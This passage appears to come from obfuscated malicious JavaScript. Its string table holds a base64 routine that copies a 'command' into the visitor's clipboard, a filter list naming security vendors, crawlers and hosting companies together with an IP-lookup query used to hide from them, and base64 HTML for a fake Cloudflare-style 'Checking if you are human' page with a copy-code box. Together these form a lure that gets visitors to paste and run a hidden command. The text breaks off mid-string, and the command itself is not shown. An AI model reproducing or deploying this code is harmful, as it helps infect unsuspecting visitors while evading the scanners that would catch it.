fSBlbHNlIGlmICh3aW5kb3cuY2xpcGJvYXJkRGF0YSkgewogICAgICAgIHdpbmRvdy5jbGlwYm9hcmREYXRhLnNldERhdGEoJ1RleHQnLCBjb21tYW5kKTsKICAgIH0KfSk7Cg==',
        'ldDwp',
        'userAgent',
        '12ylqhkS',
        'WBkiP',
        'Amazon\x20Data\x20Services\x20Ireland\x20Ltd',
        'JJbGn',
        '427323VkUgmt',
        'lwznz',
        'overlay-styles',
        '17966490nHZTTJ',
        'GHOSTnet\x20GmbH',
        'Commtouch',
        'lHhXc',
        'NBbzS',
        'lEVGO',
        'Microsoft\x20bingbot',
        'svxLA',
        'Inktomi\x20Corporation',
        '?fields=isp,org,mobile,proxy,hosting',
        'Twitter',
        'Cyveillance',
        'chrome',
        'ytOiO',
        'wsROv',
        'MRxvL',
        'notifications',
        'yandex',
        'huRDH',
        'scrape',
        'Rediff.com\x20India\x20Limited',
        'kuKGT',
        'GqIuS',
        'LLC\x20masterhost',
        'fgrqT',
        'Microsoft\x20(China)\x20Co.',
        'body',
        'LeaseWeb\x20Network\x20B.V.',
        'DYlIj',
        'xDikb',
        'vACKe',
        'harue',
        'Kaspersky\x20Lab\x20AO',
        ';\x20path=/',
        'BuYFf',
        'IjAJA',
        'LeaseWeb\x20CDN\x20B.V.',
        'Internap\x20Network\x20Services\x20Corporation',
        'OUqne',
        'IinPG',
        'LeaseWeb\x20Netherlands\x20B.V.',
        'China\x20Construction\x20Bank\x20(Asia)\x20Corporation\x20Limited',
        'Tiscali\x20UK\x20Limited',
        'China\x20Communication\x20Co.',
        'PGh0bWwgbGFuZz0iZW4iPjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPkNoZWNraW5nIGlmIHlvdSBhcmUgaHVtYW48L3RpdGxlPg0KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuMC4wLWJldGEzL2Nzcy9hbGwubWluLmNzcyI+DQogICAgPHN0eWxlPg0KICAgIGJvZHkgew0KICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmNmY2ZjOw0KICAgICAgICBjb2xvcjogIzMxMzEzMTsNCiAgICB9DQoNCiAgICAub3ZlcmxheS1zdHlsZXMgew0KICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsMjU1LDI1NSwwLjkpOw0KICAgIH0NCg0KICAgIC5jbG91ZGZsYXJlLWxvZ28gew0KICAgICAgY29sb3I6ICMwMDAwMDA7DQogICAgfQ0KDQogICAgQG1lZGlhIChwcmVmZXJzLWNvbG9yLXNjaGVtZTogZGFyaykgew0KICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMjIgIWltcG9ydGFudDsNCiAgICAgICAgICAgIGNvbG9yOiAjZDlkOWQ5ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgLnRldHR4IHsNCiAgICAgICAgICAgIGNvbG9yOiAjZDlkOWQ5ICFpbXBvcnRhbnQ7DQogICAgICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwOw0KICAgICAgICB9DQogICAgICAgIC5vdmVybGF5LXN0eWxlcyB7DQogICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjkpOw0KICAgICAgICB9DQogICAgICAgIC5jbG91ZGZsYXJlLWxvZ28gew0KICAgICAgICAgIGNvbG9yOiAjZmZmZmZmOw0KICAgICAgIH0NCiAgICAgICAgLmNoZWNrYm94LXdpbmRvdyB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjMyMzIzICFpbXBvcnRhbnQ7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgLmNoZWNrYm94IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMzIzMjMgIWltcG9ydGFudDsNCiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICM3OTc5NzkgIWltcG9ydGFudDsNCiAgICAgICAgfQ0KICAgICAgICAuaW5zdHJ1Y3Rpb25zIHsNCiAgICAgICAgICAgIGNvbG9yOiAjZDlkOWQ5ICFpbXBvcnRhbnQ7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgfQ0KDQogICAgLnRldHR4IHsNCiAgICAgICAgICAgIGNvbG9yOiAjMzEzMTMxOw0KICAgIH0NCg0KICAgIC52ZXJpZnktbWFpbiB7DQogICAgICAgICAgICBjb2xvcjogIzMxMzEzMSAhaW1wb3J0YW50Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktdmVyaWZ5LWJ1dHRvbiB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMzMzMzMzICFpbXBvcnRhbnQ7DQogICAgfQ0KDQogICAgLmNoZWNrYm94LXdpbmRvdyB7DQogICAgIGRpc3BsYXk6IGZsZXg7DQogICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQogICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgIHdpZHRoOiAzMDBweDsNCiAgICAgaGVpZ2h0OiA3NHB4Ow0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmFmYWZhOw0KICAgICBib3JkZXI6IDFweCBzb2xpZCAjZTBlMGUwOw0KICAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgIHBhZGRpbmc6IDEwcHg7DQogICAgIG92ZXJmbG93OiBoaWRkZW47DQogICAgIHRyYW5zaXRpb246IHdpZHRoIDAuNXMgZWFzZS1pbi1vdXQsIGhlaWdodCAwLjVzIGVhc2UtaW4tb3V0Ow0KICAgIH0NCg0KICAgIC50aGVtZS1kYXJrIC5sb2dvLXRleHQgew0KICAgIGZpbGw6ICNmZmY7DQogICAgfQ0KDQogICAgLmNoZWNrYm94LWNvbnRhaW5lciB7DQogICAgIHdpZHRoOiAyOHB4Ow0KICAgICBoZWlnaHQ6IDI4cHg7DQogICAgIG1hcmdpbi1sZWZ0OiAxMnB4Ow0KICAgICBtYXJnaW4tcmlnaHQ6IDhweDsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICB9DQoNCi5jaGVja2JveCB7DQogICAgd2lkdGg6IDEwMCU7DQogICAgaGVpZ2h0OiAxMDAlOw0KICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7DQogICAgYm9yZGVyLXJhZGl1czogMnB4Ow0KICAgIGJvcmRlcjogMnB4IHNvbGlkICM4ODg4ODg7DQogICAgY3Vyc29yOiBwb2ludGVyOw0KICAgIHRyYW5zaXRpb246IGJvcmRlci1jb2xvciAwLjNzLCBiYWNrZ3JvdW5kLWNvbG9yIDAuM3M7DQogICAgZGlzcGxheTogZmxleDsNCiAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KfQ0KDQogICAgLmNoZWNrYm94LmNoZWNrZWQgew0KICAgICBib3JkZXItY29sb3I6ICM0Mjg1ZjQ7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICM0Mjg1ZjQ7DQogICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICB9DQoNCiAgICAuY2hlY2tib3guY2hlY2tlZDo6YWZ0ZXIgew0KICAgICBjb250ZW50OiAiXGYwMGMiOw0KICAgICBmb250LWZhbWlseTogIkZvbnRBd2Vzb21lIjsNCiAgICAgY29sb3I6ICNmZmY7DQogICAgIGZvbnQtc2l6ZTogMThweDsNCiAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICB0b3A6IC0ycHg7DQogICAgIGxlZnQ6IDJweDsNCiAgICB9DQoNCiAgICAuc3Bpbm5lciB7DQogICAgIHZpc2liaWxpdHk6IGhpZGRlbjsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIH0NCg0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgb3BhY2l0eTogMDsNCiAgICAgdmlzaWJpbGl0eTogaGlkZGVuOw0KICAgICB3aWR0aDogMTAwJTsNCiAgICAgaGVpZ2h0OiAwOw0KICAgICB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQsIGhlaWdodCAwLjVzIGVhc2UtaW4tb3V0Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktd2luZG93LmFjdGl2ZSB7DQogICAgIG9wYWNpdHk6IDE7DQogICAgIHZpc2liaWxpdHk6IHZpc2libGU7DQogICAgIGhlaWdodDogYXV0bzsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWhlYWRlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICNlODVkMWE7DQogICAgIHBhZGRpbmc6IDEwcHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE0cHg7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIHsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICB9DQoNCiAgICAubG9nby10ZXh0IHsNCiAgICAgICAgZmlsbDogI2ZmZjsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWZvb3RlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICNmMmYyZjI7DQogICAgIHBhZGRpbmc6IDEwcHg7DQogICAgIHRleHQtYWxpZ246IHJpZ2h0Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktZm9vdGVyIGJ1dHRvbiB7DQogICAgIHBhZGRpbmc6IDhweCAxNXB4Ow0KICAgICBiYWNrZ3JvdW5kOiAjNDI4NWY0Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgYm9yZGVyOiBub25lOw0KICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgICB9DQoNCiAgICAvKiBORVcgU1RZTEUgKi8NCg0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgd2lkdGg6IGF1dG87DQogICAgfQ0KDQogICAgLnZlcmlmeS1oZWFkZXIgew0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTg1ZDFhOw0KICAgICBwYWRkaW5nOiAxMHB4IDE2cHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE0cHg7DQogICAgIGJvcmRlci1yYWRpdXM6IDA7DQogICAgfQ0KDQogICAgLmxkcy1yaW5nIGRpdiB7DQogICAgIGJvcmRlci1jb2xvcjogIzk5OSB0cmFuc3BhcmVudCB0cmFuc3BhcmVudDsNCiAgICB9DQogICAgYm9keS50aGVtZS1saWdodCAubGRzLXJpbmcgZGl2IHsNCiAgICAgYm9yZGVyLWNvbG9yOiAjNTk1OTU5IHRyYW5zcGFyZW50IHRyYW5zcGFyZW50Ow0KICAgIH0NCg0KICAgIC5sZHMtcmluZyB7DQogICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIH0NCiAgICAubGRzLXJpbmcsDQogICAgLmxkcy1yaW5nIGRpdiB7DQogICAgIGhlaWdodDogMS44NzVyZW07DQogICAgIHdpZHRoOiAxLjg3NXJlbTsNCiAgICB9DQogICAgLmxkcy1yaW5nIGRpdiB7DQogICAgIGFuaW1hdGlvbjogbGRzLXJpbmcgMS4ycyBjdWJpYy1iZXppZXIoMC41LCAwLCAwLjUsIDEpIGluZmluaXRlOw0KICAgICBib3JkZXI6IDAuM3JlbSBzb2xpZCB0cmFuc3BhcmVudDsNCiAgICAgYm9yZGVyLXJhZGl1czogNTAlOw0KICAgICBib3JkZXItdG9wLWNvbG9yOiAjMzEzMTMxOw0KICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94Ow0KICAgICBkaXNwbGF5OiBibG9jazsNCiAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIH0NCiAgICAubGRzLXJpbmcgZGl2OmZpcnN0LWNoaWxkIHsNCiAgICAgYW5pbWF0aW9uLWRlbGF5OiAtMC40NXM7DQogICAgfQ0KICAgIC5sZHMtcmluZyBkaXY6bnRoLWNoaWxkKDIpIHsNCiAgICAgYW5pbWF0aW9uLWRlbGF5OiAtMC4zczsNCiAgICB9DQogICAgLmxkcy1yaW5nIGRpdjpudGgtY2hpbGQoMykgew0KICAgICBhbmltYXRpb24tZGVsYXk6IC0wLjE1czsNCiAgICB9DQoNCiAgICBAa2V5ZnJhbWVzIGxkcy1yaW5nIHsNCiAgICAgMCUgew0KICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7DQogICAgIH0NCiAgICAgdG8gew0KICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMXR1cm4pOw0KICAgICB9DQogICAgfQ0KDQogDQoNCiAgICAgICBAbWVkaWEgKHByZWZlcnMtY29sb3Itc2NoZW1lOiBkYXJrKSB7DQogICAgIGJvZHkgLmxkcy1yaW5nIGRpdiB7DQogICAgICBib3JkZXItY29sb3I6ICM2NzY3NjcgdHJhbnNwYXJlbnQgdHJhbnNwYXJlbnQ7DQogICAgIH0NCiAgICB9DQoNCiAgICAqIHsNCiAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCiAgICAgbWFyZ2luOiAwOw0KICAgICBwYWRkaW5nOiAwOw0KICAgIH0NCiAgICBib2R5IHsNCg0KICAgICBmb250LWZhbWlseTogc3lzdGVtLXVpLCAtYXBwbGUtc3lzdGVtLCBCbGlua01hY1N5c3RlbUZvbnQsIFNlZ29lIFVJLCBSb2JvdG8sIEhlbHZldGljYSBOZXVlLCBBcmlhbCwgTm90byBTYW5zLCBzYW5zLXNlcmlmLCBBcHBsZSBDb2xvciBFbW9qaSwgU2Vnb2UgVUkgRW1vamksIFNlZ29lIFVJIFN5bWJvbCwgTm90byBDb2xvciBFbW9qaTsNCiAgICB9DQoNCiAgICBib2R5IHsNCiAgICAgZGlzcGxheTogZmxleDsNCiAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICAgaGVpZ2h0OiAxMDB2aDsNCiAgICAgbWluLWhlaWdodDogMTAwdmg7DQogICAgfQ0KDQogICAgLm1haW4td3JhcHBlciB7DQogICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgIGRpc3BsYXk6IGZsZXg7DQogICAgIGZsZXg6IDE7DQogICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQogICAgIG1pbi1oZWlnaHQ6IDEwMCU7DQogICAgfQ0KICAgIC5tYWluLWNvbnRlbnQgew0KICAgICBtYXJnaW46IDhyZW0gYXV0bzsNCiAgICAgbWF4LXdpZHRoOiA2MHJlbTsNCiAgICAgcGFkZGluZy1sZWZ0OiAxLjVyZW07DQogICAgIHBhZGRpbmctcmlnaHQ6IDEuNXJlbTsNCiAgICAgd2lkdGg6IDEwMCU7DQogICAgfQ0KDQogICAgLmZvb3RlciB7DQogICAgIGZvbnQtc2l6ZTogMC43NXJlbTsNCiAgICAgbGluZS1oZWlnaHQ6IDEuMTI1cmVtOw0KICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgbWF4LXdpZHRoOiA2MHJlbTsNCiAgICAgcGFkZGluZy1sZWZ0OiAxLjVyZW07DQogICAgIHBhZGRpbmctcmlnaHQ6IDEuNXJlbTsNCiAgICAgd2lkdGg6IDEwMCU7DQogICAgIG1hcmdpbi10b3A6IGF1dG87DQogICAgfQ0KDQogICAgLmZvb3Rlci1pbm5lciB7DQogICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjZDlkOWQ5Ow0KICAgICBwYWRkaW5nLWJvdHRvbTogMXJlbTsNCiAgICAgcGFkZGluZy10b3A6IDFyZW07DQogICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICB9DQogICAgLyogUG9wdXAgVmVyaWZpY2F0aW9uIFdpbmRvdyAqLw0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgZm9udC1mYW1pbHk6IFJvYm90bywgaGVsdmV0aWNhLCBhcmlhbCwgc2Fucy1zZXJpZjsNCiAgICAgb3BhY2l0eTogMDsNCiAgICAgdmlzaWJpbGl0eTogaGlkZGVuOw0KICAgICBtYXJnaW46IGF1dG87DQogICAgIHdpZHRoOiAzMTBweDsNCiAgICAgdHJhbnNpdGlvbjogb3BhY2l0eSA0MDBtczsNCiAgICB9DQoNCiAgICAudmVyaWZ5LXdpbmRvdyB7DQogICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICB0b3A6IDVweDsNCiAgICAgbGVmdDogNTRweDsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWhlYWRlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICMxYTczZTg7DQogICAgIHBhZGRpbmc6IDE2cHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE4cHg7DQogICAgIGJvcmRlci1yYWRpdXM6IDhweCA4cHggMCAwOw0KICAgIH0NCg0KICAgIC52ZXJpZnktbWFpbiB7DQogICAgIHBhZGRpbmc6IDE2cHg7DQogICAgIGZvbnQtc2l6ZTogMTRweDsNCiAgICAgY29sb3I6ICMzMzM7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIG9sIHsNCiAgICAgcGFkZGluZy1sZWZ0OiAyMHB4Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktbWFpbiBvbCBsaSB7DQogICAgIG1hcmdpbi1ib3R0b206IDEwcHg7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIGNvZGUgew0KICAgICBkaXNwbGF5OiBibG9jazsNCiAgICAgbWFyZ2luLXRvcDogMTBweDsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Y5ZjlmOTsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgZm9udC1zaXplOiAxMnB4Ow0KICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOw0KICAgIH0NCg0KICAgIC52ZXJpZnktZm9vdGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2YyZjJmMjsNCiAgICAgcGFkZGluZzogMTZweDsNCiAgICAgdGV4dC1hbGlnbjogcmlnaHQ7DQogICAgfQ0KDQogICAgLnZlcmlmeS1mb290ZXIgYnV0dG9uIHsNCiAgICAgcGFkZGluZzogMTBweCAyMHB4Ow0KICAgICBiYWNrZ3JvdW5kOiAjNDI4NWY0Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgYm9yZGVyOiBub25lOw0KICAgICBib3JkZXItcmFkaXVzOiA1cHg7DQogICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICB9DQoNCiAgICAub3ZlcmxheSB7DQogICAgIGRpc3BsYXk6IG5vbmU7DQogICAgIHBvc2l0aW9uOiBmaXhlZDsNCiAgICAgdG9wOiAwOw0KICAgICBsZWZ0OiAwOw0KICAgICB3aWR0aDogMTAwJTsNCiAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuNSk7DQogICAgIHotaW5kZXg6IDEwOw0KICAgIH0NCg0KICAgIC5vdmVybGF5LmFjdGl2ZSwNCiAgICAudmVyaWZ5LXdpbmRvdy5hY3RpdmUgew0KICAgICBkaXNwbGF5OiBibG9jazsNCiAgICB9DQoNCiAgICAudmVyaWZ5LXdpbmRvdyB7DQogICAgIHdpZHRoOiBhdXRvOw0KICAgIH0NCg0KICAgIC52ZXJpZnktaGVhZGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2U4NWQxYTsNCiAgICAgcGFkZGluZzogMTBweCAxNnB4Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICBib3JkZXItcmFkaXVzOiAwOw0KICAgIH0NCg0KICAgICNzcGlubmVyMiB7DQogICAgd2lkdGg6IDQwcHg7IA0KICAgIGhlaWdodDogNDBweDsgDQogICAgYW5pbWF0aW9uOiByb3RhdGUgNHMgbGluZWFyIGluZmluaXRlOyANCiAgICBtYXJnaW4tdG9wOiAtNHB4Ow0KICAgIA0KfQ0KDQouY2hlY2tib3gtd2luZG93IHsNCiAgDQogICAgb3BhY2l0eTogMDsNCn0NCg0KQGtleWZyYW1lcyByb3RhdGUgew0KICAgIGZyb20gew0KICAgICAgICB0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTsNCiAgICB9DQoNCiAgICB0byB7DQogICAgICAgIHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7DQogICAgfQ0KfQ0KDQoNCi8qIE5FVyBTVFlMRSAqLw0KDQogICAgLnRpbWVzdGFtcCB7DQogICAgICBmb250LXNpemU6IDEzcHg7DQogICAgICBjb2xvcjogIzdhN2E3YTsNCiAgICAgIG1hcmdpbi10b3A6IDZweDsNCiAgICB9DQoNCiAgICAuaW5zdHJ1Y3Rpb25zIHsNCiAgICAgIHRleHQtYWxpZ246IGxlZnQ7DQogICAgDQogICAgICBmb250LXNpemU6IDE1cHg7DQogICAgICBjb2xvcjogIzMzMzMzMzsNCiAgICAgIGxpbmUtaGVpZ2h0OiAxLjY7DQogICAgfQ0KDQogICAgLmluc3RydWN0aW9ucyBvbCB7DQogICAgICBtYXJnaW46IDA7DQogICAgICBwYWRkaW5nLWxlZnQ6IDIwcHg7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2sgew0KICAgIGJhY2tncm91bmQtY29sb3I6ICNmMWYxZjE7DQogICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsNCiAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgcGFkZGluZzogOHB4IDEycHg7DQogICAgZm9udC1mYW1pbHk6IENvbnNvbGFzLCBtb25vc3BhY2U7DQogICAgZm9udC1zaXplOiAxNHB4Ow0KICAgIG1hcmdpbi10b3A6IDhweDsNCiAgICBwb3NpdGlvbjogcmVsYXRpdmU7DQogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzOw0KICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICB1c2VyLXNlbGVjdDogbm9uZTsNCiAgICB9DQoNCg0KICAgIC5jb2RlLWJsb2NrOmhvdmVyIHsNCiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlNmU2ZTY7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2s6OmFmdGVyIHsNCiAgICAgIGNvbnRlbnQ6ICJDb3B5IjsNCiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgIHRvcDogNTAlOw0KICAgICAgcmlnaHQ6IDEycHg7DQogICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSk7DQogICAgICBmb250LXNpemU6IDEycHg7DQogICAgICBjb2xvcjogIzAwNzhkNDsNCiAgICAgIG9wYWNpdHk6IDA7DQogICAgICB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuMnM7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2s6aG92ZXI6OmFmdGVyIHsNCiAgICAgIG9wYWNpdHk6IDE7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2suY2xpY2tlZDo6YWZ0ZXIgew0KICAgICAgY29udGVudDogIkNvcGllZCI7DQogICAgICBjb2xvcjogIzEwN2MxMDsNCiAgICB9DQoNCiAgICAjZmlsZUV4cGxvcmVyIHsNCiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDc4ZDQ7DQogICAgICBjb2xvcjogd2hpdGU7DQogICAgICBib3JkZXI6IG5vbmU7DQogICAgICBwYWRkaW5nOiAxMnB4IDMwcHg7DQogICAgICBmb250LXNpemU6IDE1cHg7DQogICAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgICBtYXJnaW46IDIwcHggMCAxMHB4Ow0KICAgICAgY3Vyc29yOiBwb2ludGVyOw0KDQogICAgfQ0KDQogICAgI2ZpbGVFeHBsb3Jlcjpob3ZlciB7DQogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA1ZWEyOw0KICAgIH0NCg0KI3ZlcmlmeS13aW5kb3cgew0KICAgICAgICB3aWR0aDogMTAwJTsNCn0NCg0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KPGRpdiBjbGFzcz0ibWFpbi13cmFwcGVyIj4NCiA8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiPg0KICA8ZGl2IHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyI+DQogICANCiAgPCEtLSA8aW1nIHNyYz0iaHR0cHM6Ly8yY2FwdGNoYS5jb20vZGlzdC93ZWIvYXNzZXRzL2dvb2dsZS1wcml2YWN5LXBvbGljeS1DYjBDR1ZSVC5zdmciIC8+IC0tPg0KDQogICA8IS0tIDxpbWcgY2xhc3M9ImxvZ28taW1nIiBzcmM9IiIgc3R5bGU9ImhlaWdodDogMnJlbTsgbWFyZ2luLXJpZ2h0OiAwLjVyZW07IiA+IC0tPg0KDQoNCg0KICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMi41cmVtOyBmb250LXdlaWdodDogNTAwOyBsaW5lLWhlaWdodDogMy43NXJlbTsiPjxzcGFuIGNsYXNzPSJkb21haW4tbmFtZSI+PC9zcGFuPjwvcD4NCiAgPC9kaXY+DQoNCiA8ZGl2IHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsgbGluZS1oZWlnaHQ6IDIuMjVyZW07IG1hcmdpbi1ib3R0b206IDJyZW07IG1pbi1oZWlnaHQ6IDJyZW07Ij4NCiAgPHA+DQogICAgPHNwYW4gY2xhc3M9InByZWxvYWRlcl90ZXh0Ij5DaGVja2luZyBpZiB5b3UgYXJlIGh1bWFuLiBUaGlzIG1heSB0YWtlIGEgZmV3IHNlY29uZHMuPC9zcGFuPg0KICAgIDxzcGFuIGNsYXNzPSJ0ZXh0YWxsc3RlcCIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij5WZXJpZnkgeW91IGFyZSBodW1hbiBieSBjb21wbGV0aW5nIHRoZSBhY3Rpb24gYmVsb3cuPC9zcGFuPiAgIA0KICA8L3A+DQo8L2Rpdj4NCg0KICA8IS0tIFBSRUxPQURFUiAtLT4NCiAgPGRpdiBjbGFzcz0icHJlbG9hZGVyIj4NCiAgICAgICA8ZGl2IGNsYXNzPSJsZHMtcmluZyI+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgIDwvZGl2Pg0KICA8L2Rpdj4NCg0KDQoNCiAgPCEtLSBTVEFSVCAtLT4NCg0KICA8ZGl2IGlkPSJjaGVja2JveC13aW5kb3ciIGNsYXNzPSJjaGVja2JveC13aW5kb3ciIHN0eWxlPSJ3aWR0aDogMzAwcHg7IGhlaWdodDogNzRweDsgZGlzcGxheTogbm9uZTsiPg0KICAgPGRpdiBzdHlsZT0iZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsiPg0KICAgIDxkaXYgY2xhc3M9ImNoZWNrYm94LWNvbnRhaW5lciIgc3R5bGU9Im1hcmdpbi1sZWZ0OiAzcHg7IG1hcmdpbi1yaWdodDogMTJweDsgd2lkdGg6IDMwcHg7Ij4NCg0KICAgICA8c3ZnIHN0eWxlPSJkaXNwbGF5OiBub25lOyIgY2xhc3M9InN0ZXAwIiBpZD0ic3Bpbm5lcjIiIGZpbGw9ImdyZWVuIiB2aWV3Qm94PSIwIDAgNjAgNjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+DQogICAgICAgIDxjaXJjbGUgY3g9IjMwIiBjeT0iMTAiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iNTAiIGN5PSIzMCIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSIzMCIgY3k9IjUwIiByPSIyLjUiIGNsYXNzPSJwb2ludCI+PC9jaXJjbGU+DQogICAgICAgIDxjaXJjbGUgY3g9IjEwIiBjeT0iMzAiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iNDMuNiIgY3k9IjE2LjQiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iMTYuNCIgY3k9IjE2LjQiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iNDMuNiIgY3k9IjQzLjYiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iMTYuNCIgY3k9IjQzL